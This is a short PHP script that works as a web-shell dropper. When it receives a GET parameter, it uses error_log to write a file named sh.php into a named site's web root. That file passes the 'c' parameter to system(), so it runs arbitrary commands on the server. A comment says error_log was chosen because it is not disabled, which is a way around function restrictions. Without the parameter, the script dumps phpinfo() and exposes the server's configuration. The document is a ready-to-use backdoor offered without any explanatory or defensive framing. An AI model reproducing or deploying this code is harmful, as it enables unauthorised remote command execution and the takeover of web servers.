  <?php
  if(isset($_GET['x'])){
      $cmd = $_GET['x'];
      // Write a webshell using error_log (not disabled)
      error_log('<?php system($_GET["c"]); ?>', 3, '/www/wwwroot/xlch49.pics/sh.php');
      echo "webshell written to sh.php";
  } else {
      phpinfo();
  }
  ?>
